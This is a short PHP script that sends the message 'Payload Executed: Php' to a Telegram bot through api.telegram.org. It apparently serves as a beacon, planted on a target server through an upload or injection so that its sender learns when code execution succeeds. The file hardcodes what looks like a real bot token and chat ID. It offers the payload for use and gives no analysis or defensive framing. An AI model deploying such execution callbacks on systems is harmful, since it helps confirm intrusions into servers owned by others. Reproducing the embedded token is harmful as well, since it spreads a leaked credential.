<?php
// Replace with your bot token and chat ID
$botToken = "8128117790:AAHhKWnFTuk4DIeFsl1xyBiUsYxovpzm-_w";
$chatId = "817280214";
$message = "Payload Executed: Php";

// Telegram API URL
$telegramApiUrl = "https://api.telegram.org/bot$botToken/sendMessage";

// Create the POST data
$data = [
    'chat_id' => $chatId,
    'text' => $message
];

// Define the HTTP context
$options = [
    'http' => [
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data),
    ]
];

// Create the context and send the request
$context  = stream_context_create($options);
$result = file_get_contents($telegramApiUrl, false, $context);

if ($result === FALSE) {
    die('Error sending message');
}

// Print response (optional)
echo "Message sent successfully: $result\n";
?>
